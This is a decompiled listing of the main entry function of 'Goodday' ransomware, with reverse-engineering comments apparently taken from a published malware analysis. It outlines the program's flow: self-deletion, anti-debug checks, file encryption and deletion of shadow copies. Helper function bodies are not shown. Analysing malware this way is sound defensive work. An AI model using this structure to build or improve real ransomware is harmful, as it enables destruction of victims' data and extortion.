////////////////////////////////////////////////////////////
// Goodday Ransomware
// https://www.shadowstackre.com/analysis/goodday
//
// Analysis: ShadowStackRE
////////////////////////////////////////////////////////////
int __stdcall __noreturn WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
  const WCHAR *CommandLineW; // eax
  HANDLE CurrentProcess; // eax
  LPCWSTR *v6; // [esp+0h] [ebp-8h]
  int pNumArgs; // [esp+4h] [ebp-4h] BYREF

  pNumArgs = 0;
  CommandLineW = GetCommandLineW();
  v6 = (LPCWSTR *)CommandLineToArgvW(CommandLineW, &pNumArgs);
  DeleteSelfFromDisk();                         // Step #1: Delete self from disk
  IfDebugRelaunch(&pNumArgs, v6);               // Step #2: If debug relaunch self
  CheckIfProcessRunning(15, (int)processExeList);// Step #3: Anti-debug process check
  EmptyClipboard();                             // Step #4: Empty Clipboard and Delay process shutdown order
  SetProcessShutdownParameters(0, 0);
  sub_41A6D0();
  GetProcessHeapHandle();
  sub_4184D0(pNumArgs, (int)v6);
  ProcessFilesEncryption(pNumArgs, v6);         // Step #5: Discover Files and Encrypt
  if ( dword_479000 == 1 )
  {
    dword_47C71C = 0;
    dword_479000 = 2;
    CurrentProcess = GetCurrentProcess();
    SetPriorityClass(CurrentProcess, 0x20u);
    ProcessFilesEncryption(pNumArgs, v6);
  }
  DeleteShadowCopy();                           // Step #6 - Delete Shadow Copies
  sub_418920();
  DeleteSelf();                                 // Step #7 - DeleteSelf
  ExitProcess(0);
}
